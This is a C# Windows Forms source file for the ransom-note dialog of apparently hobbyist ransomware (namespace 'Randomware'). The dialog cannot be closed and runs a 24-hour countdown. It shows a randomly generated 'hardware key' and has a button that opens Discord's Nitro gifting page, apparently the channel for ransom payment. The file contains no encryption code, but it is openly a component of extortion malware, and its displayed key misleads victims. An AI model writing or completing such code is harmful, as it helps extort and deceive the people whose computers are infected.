using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client.Armitage.Randomware
{
    public partial class Dialog : Form
    {
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
        (
            int nLeftRect,     // x-coordinate of upper-left corner
            int nTopRect,      // y-coordinate of upper-left corner
            int nRightRect,    // x-coordinate of lower-right corner
            int nBottomRect,   // y-coordinate of lower-right corner
            int nWidthEllipse, // width of ellipse
            int nHeightEllipse // height of ellipse
        );
        private const int CP_NOCLOSE_BUTTON = 0x200;
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams myCp = base.CreateParams;
                myCp.ClassStyle = myCp.ClassStyle | CP_NOCLOSE_BUTTON;
                return myCp;
            }
        }
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        public int TimeLeft = 86400;

        public const int KeySize = 64;

        public byte[] HardwareKey;

        private Timer t;
        public Dialog()
        {
            InitializeComponent();

            t = new Timer { Interval = 1000 };
            t.Tick += T_Tick;
            t.Start();

            Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(1, 1, Width, Height, 20, 20));

            // set hardware id
            HardwareKey = Client.Utilities.Random_Generator.GetByteArray(KeySize);

            richTextBox1.Text = Utilities.Converter.BytesToString(HardwareKey);

        }

        private void T_Tick(object sender, EventArgs e)
        {
            TimeLeft--;

            label5.Text = $"You have {TimeLeft} seconds left.";
        }

        private void Clicked(object sender, MouseEventArgs e)
        {
            if (e.Button == System.Windows.Forms.MouseButtons.Left)
            {
                ReleaseCapture();

                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void Clicked(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Process.Start("https://support.discord.com/hc/en-us/articles/360020877112-Nitro-Gifting");
        }
    }
}
